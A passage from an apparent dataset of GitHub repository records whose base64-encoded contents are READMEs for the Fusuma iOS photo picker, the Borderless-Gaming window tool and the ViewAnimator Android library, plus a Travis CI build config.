OiBGcm9udCAmIEJhY2sgCi0gW3hdIFZpZGVvIE1vZGUKLSBbeF0gQ29sb3Jz
IGZ1bGx5IGN1c3RvbWl6YWJsZQoKVGhvc2UgZmVhdHVyZXMgYXJlIGF2YWls
YWJsZSBqdXN0IHdpdGggYSBmZXcgbGluZXMgb2YgY29kZSEKCiMjIEluc3Rh
bGxhdGlvbgoKIyMjIyBNYW51YWwgaW5zdGFsbGF0aW9uCgpEb3dubG9hZCBh
bmQgZHJvcCB0aGUgJ0NsYXNzZXMnIGZvbGRlciBpbnRvIHlvdXIgWGNvZGUg
cHJvamVjdC4gIAoKIyMjIyBVc2luZyBbQ29jb2FQb2RzXShodHRwOi8vY29j
b2Fwb2RzLm9yZy8pCgpBZGQgYHBvZCAnRnVzdW1hJ2AgdG8geW91ciBgUG9k
ZmlsZWAgYW5kIHJ1biBgcG9kIGluc3RhbGxgLiBBbHNvIGFkZCBgdXNlX2Zy
YW1ld29ya3MhYCB0byB0aGUgYFBvZGZpbGVgLgoKYGBgCnVzZV9mcmFtZXdv
cmtzIQpwb2QgJ0Z1c3VtYScKYGBgCgojIyMjIFN3aWZ0IDMKVGhlIGxhdGVz
dCB2ZXJzaW9uIGRvZXMgc3VwcG9ydCBTd2lmdCA0LjIuIElmIHlvdSdyZSBz
dGlsbCB1c2luZyBTd2lmdCAzLCB5b3UgY2FuIGluc3RhbGwgRnVzdW1hIGFz
IGZvbGxvd3M6CgpgcG9kICdGdXN1bWEnLCBnaXQ6ICdnaXRAZ2l0aHViLmNv
bTp5dGFremsvRnVzdW1hLmdpdCcsIGJyYW5jaDogJ3N3aWZ0LTMnYAoKIyMg
RnVzdW1hIFVzYWdlCkltcG9ydCBGdXN1bWEgYGBgaW1wb3J0IEZ1c3VtYWBg
YCB0aGVuIHVzZSB0aGUgZm9sbG93aW5nIGNvZGVzIGluIHNvbWUgZnVuY3Rp
b24gZXhjZXB0IGZvciB2aWV3RGlkTG9hZCBhbmQgZ2l2ZSBGdXN1bWFEZWxl
Z2F0ZSB0byB0aGUgdmlldyBjb250cm9sbGVyLiAgCgpgYGBTd2lmdApsZXQg
ZnVzdW1hID0gRnVzdW1hVmlld0NvbnRyb2xsZXIoKQpmdXN1bWEuZGVsZWdh
dGUgPSBzZWxmCmZ1c3VtYS5hdmFpbGFibGVNb2RlcyA9IFtGdXN1bWFNb2Rl
LmxpYnJhcnksIEZ1c3VtYU1vZGUuY2FtZXJhLCBGdXN1bWFNb2RlLnZpZGVv
XSAvLyBBZGQgLnZpZGVvIGNhcHR1cmluZyBtb2RlIHRvIHRoZSBkZWZhdWx0
IC5saWJyYXJ5IGFuZCAuY2FtZXJhIG1vZGVzCmZ1c3VtYS5jcm9wSGVpZ2h0
UmF0aW8gPSAwLjYgLy8gSGVpZ2h0LXRvLXdpZHRoIHJhdGlvLiBUaGUgZGVm
YXVsdCB2YWx1ZSBpcyAxLCB3aGljaCBtZWFucyBhIHNxdWFyZWQtc2l6ZSBw
aG90by4KZnVzdW1hLmFsbG93TXVsdGlwbGVTZWxlY3Rpb24gPSB0cnVlIC8v
IFlvdSBjYW4gc2VsZWN0IG11bHRpcGxlIHBob3RvcyBmcm9tIHRoZSBjYW1l
cmEgcm9sbC4gVGhlIGRlZmF1bHQgdmFsdWUgaXMgZmFsc2UuCnNlbGYucHJl
c2VudChmdXN1bWEsIGFuaW1hdGVkOiB0cnVlLCBjb21wbGV0aW9uOiBuaWwp
CmBgYAoKIyMjIyBEZWxlZ2F0ZSBtZXRob2RzCgpgYGBTd2lmdAovLyBSZXR1
cm4gdGhlIGltYWdlIHdoaWNoIGlzIHNlbGVjdGVkIGZyb20gY2FtZXJhIHJv
bGwgb3IgaXMgdGFrZW4gdmlhIHRoZSBjYW1lcmEuCmZ1bmMgZnVzdW1hSW1h
Z2VTZWxlY3RlZChfIGltYWdlOiBVSUltYWdlLCBzb3VyY2U6IEZ1c3VtYU1v
ZGUpIHsKCiAgcHJpbnQoIkltYWdlIHNlbGVjdGVkIikKfQoKLy8gUmV0dXJu
IHRoZSBpbWFnZSBidXQgY2FsbGVkIGFmdGVyIGlzIGRpc21pc3NlZC4KZnVu
YyBmdXN1bWFEaXNtaXNzZWRXaXRoSW1hZ2UoaW1hZ2U6IFVJSW1hZ2UsIHNv
dXJjZTogRnVzdW1hTW9kZSkgewogICAgICAgIAogIHByaW50KCJDYWxsZWQg
anVzdCBhZnRlciBGdXN1bWFWaWV3Q29udHJvbGxlciBpcyBkaXNtaXNzZWQu
IikKfQoKZnVuYyBmdXN1bWFWaWRlb0NvbXBsZXRlZCh3aXRoRmlsZVVSTCBm
aWxlVVJMOiBVUkwpIHsKCiAgcHJpbnQoIkNhbGxlZCBqdXN0IGFmdGVyIGEg
dmlkZW8gaGFzIGJlZW4gc2VsZWN0ZWQuIikKfQoKLy8gV2hlbiBjYW1lcmEg
cm9sbCBpcyBub3QgYXV0aG9yaXplZCwgdGhpcyBtZXRob2QgaXMgY2FsbGVk
LgpmdW5jIGZ1c3VtYUNhbWVyYVJvbGxVbmF1dGhvcml6ZWQoKSB7CgogIHBy
aW50KCJDYW1lcmEgcm9sbCB1bmF1dGhvcml6ZWQiKQp9CgovLyBSZXR1cm4g
c2VsZWN0ZWQgaW1hZ2VzIHdoZW4geW91IGFsbG93IHRvIHNlbGVjdCBtdWx0
aXBsZSBwaG90b3MuCmZ1bmMgZnVzdW1hTXVsdGlwbGVJbWFnZVNlbGVjdGVk
KF8gaW1hZ2VzOiBbVUlJbWFnZV0sIHNvdXJjZTogRnVzdW1hTW9kZSkgewoK
fQoKLy8gUmV0dXJuIGFuIGltYWdlIGFuZCB0aGUgZGV0YWlsZWQgaW5mb3Jt
YXRpb24uCmZ1bmMgZnVzdW1hSW1hZ2VTZWxlY3RlZChfIGltYWdlOiBVSUlt
YWdlLCBzb3VyY2U6IEZ1c3VtYU1vZGUsIG1ldGFEYXRhOiBJbWFnZU1ldGFk
YXRhKSB7Cgp9CmBgYAoKIyMjIyBIb3cgVG8gQ3VzdG9taXplCgpgYGBTd2lm
dApsZXQgZnVzdW1hID0gRnVzdW1hVmlld0NvbnRyb2xsZXIoKQpmdXN1bWEu
ZGVsZWdhdGUgPSBzZWxmCi8vIC4uLgpmdXN1bWFDYW1lcmFSb2xsVGl0bGUg
PSAiQ3VzdG9taXplQ2FtZXJhUm9sbFRpdGxlIgpmdXN1bWFDYW1lcmFUaXRs
ZSA9ICJDdXN0b21pemVDYW1lcmFUaXRsZSIgLy8gQ2FtZXJhIFRpdGxlCmZ1
c3VtYVRpbnRDb2xvcjogVUlDb2xvciAvLyB0aW50IGNvbG9yCi8vIC4uLgpz
ZWxmLnByZXNlbnQoZnVzdW1hLCBhbmltYXRlZDogdHJ1ZSwgY29tcGxldGlv
bjogbmlsKQoKYGBgCgojIyMgUHJvcGVydGllcwoKfCBQcm9wIHwgVHlwZSB8
IERlc2NyaXB0aW9uIHwgRGVmYXVsdCB8CnwtLS18LS0tfC0tLXwtLS18Cnwq
KmBmdXN1bWFCYXNlVGludENvbG9yIGAqKnxVSUNvbG9yfEJhc2UgdGludCBj
b2xvci58YFVJQ29sb3IuaGV4KCIjYzljN2M4IiwgYWxwaGE6IDEuMClgfAp8
KipgZnVzdW1hVGludENvbG9yIGAqKnxVSUNvbG9yfFRpbnQgY29sb3IufGBV
SUNvbG9yLmhleCgiI0ZDRkNGQyIsIGFscGhhOiAxLjApYHwKfCoqYGZ1c3Vt
YUJhY2tncm91bmRDb2xvciBgKip8VUlDb2xvcnxCYWNrZ3JvdW5kIGNvbG9y
LnxgVUlDb2xvci5oZXgoIiNjOWM3YzgiLCBhbHBoYTogMS4wKWB8CnwqKmBm
dXN1bWFDaGVja0ltYWdlIGAqKnwgVUlJbWFnZSB8IEltYWdlIG9mIGNoZWNr
IGJ1dHRvbi58IVtdKC4vU291cmNlcy9Bc3NldHMueGNhc3NldHMvaWNfY2hl
Y2suaW1hZ2VzZXQvaWNfY2hlY2tfd2hpdGVfNDhwdC5wbmcpfAp8KipgZnVz
dW1hQ2xvc2VJbWFnZSBgKip8IFVJSW1hZ2UgfEltYWdlIG9mIGNsb3NlIGJ1
dHRvbi58IVtdKC4vU291cmNlcy9Bc3NldHMueGNhc3NldHMvaWNfY2xvc2Uu
aW1hZ2VzZXQvaWNfY2xvc2Vfd2hpdGVfNDhwdC5wbmcpfAp8KipgZnVzdW1h
Q3JvcEltYWdlIGAqKnwgQm9vbCB8V2hldGhlciB0byBjcm9wIHRoZSB0YWtl
biBpbWFnZS58IGB0cnVlYCB8CnwqKmBmdXN1bWFTYXZlc0ltYWdlIGAqKnwg
Qm9vbCB8V2hldGhlciB0byBzYXZlIHRoZSB0YWtlbiBpbWFnZS58IGBmYWxz
ZWAgfAp8KipgZnVzdW1hQ2FtZXJhUm9sbFRpdGxlIGAqKnwgU3RyaW5nIHxU
ZXh0IG9mIGNhbWVyYSByb2xsIHRpdGxlLnwgYCJMaWJyYXJ5ImAgfAp8Kipg
ZnVzdW1hQ2FtZXJhVGl0bGUgYCoqfCBTdHJpbmcgfFRleHQgb2YgY2FybWVy
YSB0aXRsZSB0ZXh0LnwgYFBob3RvYCB8CnwqKmBmdXN1bWFWaWRlb1RpdGxl
IGAqKnwgU3RyaW5nIHxUZXh0IG9mIHZpZGVvIHRpdGxlLnwgYFZpZGVvYCB8
CnwqKmBmdXN1bWFUaXRsZUZvbnQgYCoqfCBVSUZvbnQgfEZvbnQgZm9yIHRp
dGxlIHRleHQufCBgVUlGb250KG5hbWU6ICJBdmVuaXJOZXh0LURlbWlCb2xk
Iiwgc2l6ZTogMTUpYCB8CgojIyBGdXN1bWEgZm9yIFhhbWFyaW4KQ2hlZXNl
YmFyb24gZGV2ZWxvcGVkIENoYWZ1IGZvciBYYW1hcmluLiAgCmh0dHBzOi8v
Z2l0aHViLmNvbS9DaGVlc2ViYXJvbi9DaGFmdQoKIyMgQXV0aG9yCnl0YWt6
ayAgCiBbaHR0cHM6Ly95dGFremsubWVdKGh0dHBzOi8veXRha3prLm1lKQog
CiMjIERvbmF0aW9uCllvdXIgc3VwcG9ydCBpcyB3ZWxjb21lIHRocm91Z2gg
Qml0Y29pbiAzUHM4dEJnejRxbjZ6VlVyNUQxd2NZcnJ6WWpNZ0V1Z3F2CiAK
IyMgTGljZW5zZQpGdXN1bWEgaXMgcmVsZWFzZWQgdW5kZXIgdGhlIE1JVCBs
aWNlbnNlLiAgClNlZSBMSUNFTlNFIGZvciBkZXRhaWxzLgo=
",,"bGFuZ3VhZ2U6IG9iamVjdGl2ZS1jCm9zeF9pbWFnZTogeGNvZGUxMC4xCnNj
cmlwdDoKICAtIHNldCAtbyBwaXBlZmFpbAogIC0geGNvZGVidWlsZCAtdmVy
c2lvbgogIC0geGNvZGVidWlsZCAtc2hvd3Nka3MKICAtIHhjb2RlYnVpbGQg
dGVzdCAtd29ya3NwYWNlIEZ1c3VtYS54Y3dvcmtzcGFjZSAtc2NoZW1lIEZ1
c3VtYUV4YW1wbGUgLXNkayBpcGhvbmVzaW11bGF0b3IgLWRlc3RpbmF0aW9u
ICdwbGF0Zm9ybT1pT1MgU2ltdWxhdG9yLG5hbWU9aVBob25lIDgnIE9OTFlf
QUNUSVZFX0FSQ0g9Tk8gYnVpbGQKCiNiZWZvcmVfaW5zdGFsbDoKIyAgLSBi
cmV3IHVwZGF0ZQojICAtIGJyZXcgdW5pbnN0YWxsIHhjdG9vbCAmJiBicmV3
IGluc3RhbGwgLS1IRUFEIHhjdG9vbAo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Borderless-Gaming',15819024,b'Play your favorite games in a borderless window; no more time consuming alt-tabs. ',b'C#',177,2377,,2377,False,b'https://api.github.com/repos/Codeusa/Borderless-Gaming/forks',"IyBbQnV5IGl0IG9uIFN0ZWFtIV0oaHR0cDovL3N0b3JlLnN0ZWFtcG93ZXJl
ZC5jb20vYXBwLzM4ODA4MCkKCiMgV2hhdCBpcyB0aGlzPwoKQm9yZGVybGVz
cyBHYW1pbmcgaXMgYSBzaW1wbGUgdG9vbCB0aGF0IHdpbGwgYWxsb3cgeW91
IHRvIHR1cm4geW91ciB3aW5kb3dlZCB2aWRlbyBnYW1lcyBpbnRvICJmdWxs
c2NyZWVuIiBhcHBsaWNhdGlvbnMgd2l0aG91dCBhbGwgb2YgdGhlIG5lZ2F0
aXZlIHNpZGUgZWZmZWN0cwoKVGhlIHByb2plY3QgaXMgb3BlbiBzb3VyY2Ug
dW5kZXIgdGhlIFtHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSB2Mi4wXSho
dHRwczovL2dpdGh1Yi5jb20vQ29kZXVzYS9Cb3JkZXJsZXNzLUdhbWluZy9i
bG9iL21hc3Rlci9MSUNFTlNFKS4KCgohW0JlZm9yZSBCb3JkZXJsZXNzLUdh
bWluZ10oaHR0cDovL2Nkbi5ha2FtYWkuc3RlYW1zdGF0aWMuY29tL3N0ZWFt
L2FwcHMvMzg4MDgwL3NzX2E1OTlkMjA5NjM4ZThkYjhhZjQzMGI3ZTkwMjhj
NDkwYzNjMjRmNzguMTkyMHgxMDgwLmpwZz90PTE0Mzc2NzI0OTMpCgohW0Fm
dGVyIEJvcmRlcmxlc3MtR2FtaW5nXShodHRwOi8vY2RuLmFrYW1haS5zdGVh
bXN0YXRpYy5jb20vc3RlYW0vYXBwcy8zODgwODAvc3NfM2Y2MjA2ZjIxMWVh
NTczZTYwMTM2NjVmNWJjYTEyNmM2YmE4OTVjZS4xOTIweDEwODAuanBnP3Q9
MTQzNzY3MjQ5MykKCiFbSW1hZ2VdKGh0dHA6Ly9jZG4uYWthbWFpLnN0ZWFt
c3RhdGljLmNvbS9zdGVhbS9hcHBzLzM4ODA4MC9zc18wYmI4Y2FiZTE4MjQ5
YjdmZGMxNjM3NjcyM2UwZmQ2MTEwYmQ3YzRlLjE5MjB4MTA4MC5qcGc/dD0x
NDM3NjcyNDkzKQoKCiMjIEhvdyB0byBpbnN0YWxsIGFuZCBydW4gQm9yZGVy
bGVzcy1HYW1pbmcKCiMjIyMgQnV5IHRocm91Z2ggU3RlYW0gYW5kIHJ1biBp
dApbQ2FuIGJlIHB1cmNoYXNlZCBoZXJlXShodHRwOi8vc3RvcmUuc3RlYW1w
b3dlcmVkLmNvbS9hcHAvMzg4MDgwKS4KCiMjIyMgSW5zdGFsbCBmcm9tIFNv
dXJjZQoKLSBDbG9uZSB3aXRoIHJlcG9zaXRvcnkgCgotIE9wZW4gdGhlIHNv
bHV0aW9uIGluc2lkZSBWaXN1YWwgU3R1ZGlvIDIwMTcKCi0gU2VsZWN0IHRo
ZSAiUmVsZWFzZSIgb3B0aW9uIAoKLSBCdWlsZCB0aGUgcHJvamVjdHMgYW5k
IHVzZSB0aGUgZ2VuZXJhdGVkIGV4ZWN1dGFibGUKCgojIyMjIFVzYWdlCltB
IGRldGFpbGVkIGd1aWRlIGNhbiBiZSBmb3VuZCBoZXJlXShodHRwczovL3N0
ZWFtY29tbXVuaXR5LmNvbS9hcHAvMzg4MDgwL2Rpc2N1c3Npb25zLzAvNTM1
MTUxNTg5ODk5NjU4Nzc4LykuCgojIyMjIE5lZWQgaGVscD8KY29udGFjdCBt
ZSBvbiBteSBbV2Vic2l0ZV0oaHR0cDovL2FuZHJldy5pbSkgCgpvciBpZiB5
b3UncmUgc3VmZmVyaW5nIGZyb20gY3Jhc2hlcyBvciBidWdzIHN1Ym1pdCBp
bmZvcm1hdGlvbiBbaGVyZV0oaHR0cHM6Ly9naXRodWIuY29tL0NvZGV1c2Ev
Qm9yZGVybGVzcy1HYW1pbmcvaXNzdWVzP3N0YXRlPW9wZW4pCgoKIyMgSGVs
cGluZyBCb3JkZXJsZXNzLUdhbWluZyAKCioqSSB3YW50IHRvIGhlbHAgd2l0
aCB0aGUgY29kZToqKiBJIGFjY2VwdCBwdWxsLXJlcXVlc3RzLCBwbGVhc2Ug
c2VlIHRoZSBbQ29udHJpYnV0aW5nIHRvIEJvcmRlcmxlc3MtR2FtaW5nXSho
dHRwczovL2dpdGh1Yi5jb20vQ29kZXVzYS9Cb3JkZXJsZXNzLUdhbWluZy9i
bG9iL21hc3Rlci9DT05UUklCVVRJTkcubWQpIGd1aWRlIGZvciBpbmZvcm1h
dGlvbiBvbiBjb250cmlidXRpbmcgdG8gdGhpcyBwcm9qZWN0LiBBbmQgZG9u
J3QgZm9yZ2V0IHRvIGFkZCB5b3VyIGNvbnRhY3QgaW5mb3JtYXRpb25zIG9u
IHRoZSBBVVRIT1JTIGxpc3QuCgoqKkkgZm91bmQgYSBidWc6KiogRmlsZSBp
dCBhcyBhbiBbaXNzdWVdKGh0dHBzOi8vZ2l0aHViLmNvbS9Db2RldXNhL0Jv
cmRlcmxlc3MtR2FtaW5nL2lzc3VlcykgYW5kIHBsZWFzZSBkZXNjcmliZSBh
cyBtdWNoIGFzIHBvc3NpYmxlIHRoZSBidWcgYW5kIHRoZSBjb250ZXh0LgoK
KipJIGhhdmUgYSBuZXcgc3VnZ2VzdGlvbjoqKiBGb3IgZmVhdHVyZSByZXF1
ZXN0cyBwbGVhc2UgZmlyc3QgY2hlY2sgW3RoZSBpc3N1ZXMgbGlzdF0oaHR0
cHM6Ly9naXRodWIuY29tL0NvZGV1c2EvQm9yZGVybGVzcy1HYW1pbmcvaXNz
dWVzKSB0byBzZWUgaWYgaXQncyBhbHJlYWR5IHRoZXJlLiBJZiBub3QsIGZl
ZWwgZnJlZSB0byBmaWxlIGl0IGFzIGFuIGlzc3VlIGFuZCB0byBkZWZpbmUg
dGhlIGxhYmVsICoqZW5oYW5jZW1lbnQqKi4KCiMjIENvbnRhY3QgaW5mbwoK
KiAqKlR3aXR0ZXI6KiogW0BBbmRyZXdNRDVdKGh0dHBzOi8vdHdpdHRlci5j
b20vYW5kcmV3bWQ1KQoqICoqQmxvZzoqKiBbYmxvZy5hbmRyZXcuaW1dKGh0
dHA6Ly9ibG9nLmFuZHJldy5pbSkKCiMgSm9pbiBvdXIgU3RlYW0gR3JvdXAh
CltCb3JkZXJsZXNzIEdhbWluZyBvbiBTdGVhbV0oaHR0cHM6Ly9zdGVhbWNv
bW11bml0eS5jb20vYXBwLzM4ODA4MC9kaXNjdXNzaW9ucy8pCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'ViewAnimator',48440451,b'A fluent Android animation library',b'Java',21,2377,,2377,False,b'https://api.github.com/repos/florent37/ViewAnimator/forks',"Vmlld0FuaW1hdG9yCj09PT09PT0KClshW0FQSV0oaHR0cHM6Ly9pbWcuc2hp
ZWxkcy5pby9iYWRnZS9BUEktMTElMkItZ3JlZW4uc3ZnKV0oaHR0cHM6Ly9n
aXRodWIuY29tL2Zsb3JlbnQzNy9WaWV3QW5pbWF0b3IvdHJlZS9tYXN0ZXIp
ClshW0FuZHJvaWQgQXJzZW5hbF0oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9i
YWRnZS9BbmRyb2lkJTIwQXJzZW5hbC1WaWV3QW5pbWF0b3ItYnJpZ2h0Z3Jl
ZW4uc3ZnP3N0eWxlPWZsYXQpXShodHRwOi8vYW5kcm9pZC1hcnNlbmFsLmNv
bS9kZXRhaWxzLzEvMjk0MikKCkEgZmx1ZW50IEFuZHJvaWQgYW5pbWF0aW9u
IGxpYnJhcnkgIQoKCjxhIGhyZWY9Imh0dHBzOi8vZ29vLmdsL1dYVzhEYyI+
CiAgPGltZyBhbHQ9IkFuZHJvaWQgYXBwIG9uIEdvb2dsZSBQbGF5IiBzcmM9
Imh0dHBzOi8vZGV2ZWxvcGVyLmFuZHJvaWQuY29tL2ltYWdlcy9icmFuZC9l
bl9hcHBfcmdiX3dvXzQ1LnBuZyIgLz4KPC9hPgoKWyFbcG5nXShodHRwczov
L3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZmxvcmVudDM3L1ZpZXdBbmlt
YXRvci9tYXN0ZXIvbW9udGFpbl9zbWFsbC5qcGcpXShodHRwczovL2dpdGh1
Yi5jb20vZmxvcmVudDM3L1ZpZXdBbmltYXRvcikKCiMgVXNhZ2UKCkFuaW1h
dGUgbXVsdGlwbGUgdmlldyBmcm9tIG9uZSBtZXRob2QKCmBgYGphdmEKVmll
d0FuaW1hdG9yCiAgICAgICAuYW5pbWF0ZShpbWFnZSkKICAgICAgICAgICAg
LnRyYW5zbGF0aW9uWSgtMTAwMCwgMCkKICAgICAgICAgICAgLmFscGhhKDAs
MSkKICAgICAgIC5hbmRBbmltYXRlKHRleHQpCiAgICAgICAgICAgIC5kcCgp
LnRyYW5zbGF0aW9uWCgtMjAsIDApCiAgICAgICAgICAgIC5kZWNlbGVyYXRl
KCkKICAgICAgICAgICAgLmR1cmF0aW9uKDIwMDApCiAgICAgICAudGhlbkFu
aW1hdGUoaW1hZ2UpCiAgICAgICAgICAgIC5zY2FsZSgxZiwgMC41ZiwgMWYp
CiAgICAgICAgICAgIC5hY2NlbGVyYXRlKCkKICAgICAgICAgICAgLmR1cmF0
aW9uKDEwMDApCiAgICAgICAuc3RhcnQoKTsKICAgICAgIApgYGAKClshW2dp
Zl0oaHR0cHM6Ly9qLmdpZnMuY29tL0VSbEJ6Vy5naWYpXShodHRwczovL3lv
dXR1LmJlL1pIdzhNZk9NMUVnKQoKV2l0aG91dCBWaWV3QW5pbWF0b3IKCmBg
YGphdmEKQW5pbWF0b3JTZXQgYW5pbWF0b3JTZXQgPSBuZXcgQW5pbWF0b3JT
ZXQoKTsKYW5pbWF0b3JTZXQucGxheVRvZ2V0aGVyKAogIE9iamVjdEFuaW1h
dG9yLm9mRmxvYXQoaW1hZ2UsInRyYW5zbGF0aW9uWSIsLTEwMDAsMCksCiAg
T2JqZWN0QW5pbWF0b3Iub2ZGbG9hdChpbWFnZSwiYWxwaGEiLDAsMSksCiAg
T2JqZWN0QW5pbWF0b3Iub2ZGbG9hdCh0ZXh0LCJ0cmFuc2xhdGlvblgiLC0y
MDAsMCkKKTsKYW5pbWF0b3JTZXQuc2V0SW50ZXJwb2xhdG9yKG5ldyBEZXNj
ZWxlcmF0ZUludGVycG9sYXRvcigpKTsKYW5pbWF0b3JTZXQuc2V0RHVyYXRp
b24oMjAwMCk7CmFuaW1hdG9yU2V0LmFkZExpc3RlbmVyKG5ldyBBbmltYXRv
ckxpc3RlbmVyQWRhcHRlcigpewogICAgQE92ZXJyaWRlIHB1YmxpYyB2b2lk
IG9uQW5pbWF0aW9uRW5kKEFuaW1hdG9yIGFuaW1hdGlvbikgewoKICAgICAg
QW5pbWF0b3JTZXQgYW5pbWF0b3JTZXQyID0gbmV3IEFuaW1hdG9yU2V0KCk7
CiAgICAgIGFuaW1hdG9yU2V0Mi5wbGF5VG9nZXRoZXIoCiAgICAgICAgICBP
YmplY3RBbmltYXRvci5vZkZsb2F0KGltYWdlLCJzY2FsZVgiLCAxZiwgMC41
ZiwgMWYpLAogICAgICAgICAgT2JqZWN0QW5pbWF0b3Iub2ZGbG9hdChpbWFn
ZSwic2NhbGVZIiwgMWYsIDAuNWYsIDFmKQogICAgICApOwogICAgICBhbmlt
YXRvclNldDIuc2V0SW50ZXJwb2xhdG9yKG5ldyBBY2NlbGVyYXRlSW50ZXJw
b2xhdG9yKCkpOwogICAgICBhbmltYXRvclNldDIuc2V0RHVyYXRpb24oMTAw
MCk7CiAgICAgIGFuaW1hdG9yU2V0Mi5zdGFydCgpOwoKICAgIH0KfSk7CmFu
aW1hdG9yU2V0LnN0YXJ0KCk7CmBgYAoKIyBNb3JlCgpbIVtnaWZdKGh0dHBz
Oi8vai5naWZzLmNvbS9YRDZSNFYuZ2lmKV0oaHR0cHM6Ly95b3V0dS5iZS9R
bGo0MFk2Q2hTTSkKCkFkZCBzYW1lIGFuaW1hdGlvbiBvbiBtdWx0aXBsZXMg
dmlldwpgYGBqYXZhClZpZXdBbmltYXRvcgogICAgICAgLmFuaW1hdGUoaW1h
Z2UsdGV4dCkKICAgICAgIC5zY2FsZSgwLDEpCiAgICAgICAuc3RhcnQoKTsK
YGBgCgpBZGQgbGlzdGVuZXJzCmBgYGphdmEKVmlld0FuaW1hdG9yCiAgICAg
ICAuYW5pbWF0ZShpbWFnZSkKICAgICAgIC5zY2FsZSgwLDEpCiAgICAgICAu
b25TdGFydCgoKSAtPiB7fSkKICAgICAgIC5vblN0b3AoKCkgLT4ge30pCiAg
ICAgICAuc3RhcnQoKTsKCmBgYAoKVXNlIERQIHZhbHVlcwpgYGBqYXZhClZp
ZXdBbmltYXRvcgogICAgICAgLmFuaW1hdGUoaW1hZ2UpCiAgICAgICAuZHAo
KS50cmFuc2xhdGlvblkoLTIwMCwgMCkKICAgICAgIC5zdGFydCgpOwpgYGAK
CkFuaW1hdGUgSGVpZ2h0IC8gV2lkdGgKYGBgamF2YQpWaWV3QW5pbWF0b3IK
ICAgICAgIC5hbmltYXRlKHZpZXcpCiAgICAgICAud2FpdEZvckhlaWdodCgp
IC8vd2FpdCB1bnRpbCBhIFZpZXdUcmVlT2JzZXJ2ZXIgbm90aWZpY2F0aW9u
CiAgICAgICAuZHAoKS53aWR0aCgxMDAsMjAwKQogICAgICAgLmRwKCkuaGVp
Z2h0KDUwLDEwMCkKICAgICAgIC5zdGFydCgpOwpgYGAKCkNvbG9yIGFuaW1h
dGlvbnMKYGBgamF2YQpWaWV3QW5pbWF0b3IKICAgICAgIC5hbmltYXRlKHZp
ZXcpCiAgICAgICAudGV4dENvbG9yKENvbG9yLkJMQUNLLENvbG9yLkdSRUVO
KQogICAgICAgLmJhY2tncm91bmRDb2xvcihDb2xvci5XSElURSxDb2xvci5C
TEFDSykKICAgICAgIC5zdGFydCgpOwpgYGAKClJvdGF0aW9uIGFuaW1hdGlv
bnMKYGBgamF2YQpWaWV3QW5pbWF0b3IKICAgICAgIC5hbmltYXRlKHZpZXcp
CiAgICAgICAucm90YXRpb24oMzYwKQogICAgICAgLnN0YXJ0KCk7CmBgYAoK
Q3VzdG9tIGFuaW1hdGlvbnMKYGBgamF2YQpWaWV3QW5pbWF0b3IKICAgICAg
IC5hbmltYXRlKHRleHQpCiAgICAgICAuY3VzdG9tKG5ldyBBbmltYXRpb25M
aXN0ZW5lci5VcGRhdGU8VGV4dFZpZXc+KCkgewogICAgICAgICAgICBAT3Zl
cnJpZGUgcHVibGljIHZvaWQgdXBkYXRlKFRleHRWaWV3IHZpZXcsIGZsb2F0
IHZhbHVlKSB7CiAgICAgICAgICAgICAgICAgIHZpZXcuc2V0VGV4dChTdHJp
bmcuZm9ybWF0KCIlLjAyZiIsdmFsdWUpKTsKICAgICAgICAgICAgfQogICAg
ICAgIH0sIDAsIDEpCiAgICAgICAuc3RhcnQoKTsKYGBgCgpDYW5jZWwgYW5p
bWF0aW9ucwpgYGBqYXZhClZpZXdBbmltYXRvciB2aWV3QW5pbWF0b3IgPSBW
aWV3QW5pbWF0b3IKICAgICAgIC5hbmltYXRlKHZpZXcpCiAgICAgICAucm90
YXRpb24oMzYwKQogICAgICAgLnN0YXJ0KCk7Cgp2aWV3QW5pbWF0b3IuY2Fu
Y2VsKCk7CmBgYAoKRW5oYW5jZWQgYW5pbWF0aW9ucyAoVGhhbmtzIFtBbmRy
b2lkVmlld0FuaW1hdGlvbnNdKGh0dHBzOi8vZ2l0aHViLmNvbS9kYWltYWpp
YS9BbmRyb2lkVmlld0FuaW1hdGlvbnMpIGFuZCBbTmlmdHlEaWFsb2dFZmZl
Y3RzXShodHRwczovL2dpdGh1Yi5jb20vc2Q2MzUyMDUxL05pZnR5RGlhbG9n
RWZmZWN0cykgKSAgIApgYGBqYXZhCi5zaGFrZSgpLmludGVycG9sYXRvcihu
ZXcgTGluZWFySW50ZXJwb2xhdG9yKCkpOwouYm91bmNlSW4oKS5pbnRlcnBv
bGF0b3IobmV3IEJvdW5jZUludGVycG9sYXRvcigpKTsKLmZsYXNoKCkucmVw
ZWF0Q291bnQoNCk7Ci5mbGlwSG9yaXpvbnRhbCgpOwoud2F2ZSgpLmR1cmF0
aW9uKDUwMDApOwoudGFkYSgpOwoucHVsc2UoKTsKLnN0YW5kVXAoKTsKLnN3
aW5nKCk7Ci53b2JibGUoKTsKYGBgCi4uLgohW1ByZXZpZXddKC9FbmhhbmNl
ZEFuaW1hdGlvbnMuZ2lmKQoKUGF0aCBhbmltYXRpb25zICggSW5zcGlyYXRp
b24gZnJvbSBodHRwOi8vYmxvZy5jc2RuLm5ldC90aWFuamlhbjQ1OTIvYXJ0
aWNsZS9kZXRhaWxzLzQ3MDY3MTYxICkgICAKYGBgamF2YQogICAgZmluYWwg
aW50W10gU1RBUlRfUE9JTlQgPSBuZXcgaW50W117IDMwMCwgMjcwIH07CiAg
ICBmaW5hbCBpbnRbXSBCT1RUT01fUE9JTlQgPSBuZXcgaW50W117IDMwMCwg
NDAwIH07CiAgICBmaW5hbCBpbnRbXSBMRUZUX0NPTlRST0xfUE9JTlQgPSBu
